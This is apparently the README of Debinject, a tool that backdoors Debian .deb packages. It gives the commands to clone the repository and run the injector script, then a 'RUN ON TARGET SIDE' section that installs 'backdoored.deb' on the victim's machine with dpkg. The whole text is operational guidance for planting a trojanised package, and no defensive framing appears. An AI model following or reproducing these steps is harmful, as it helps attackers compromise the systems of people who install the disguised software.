### CLONE
```
git clone https://github.com/UndeadSec/Debinject.git
```

### RUNNING
```
cd Debinject
```

```
python debinject.py
```

If you have another version of Python:

```
python2.7 debinject.py
```

### RUN ON TARGET SIDE

```
chmod 755 backdoored.deb
```

```
dpkg -i backdoored.deb
```
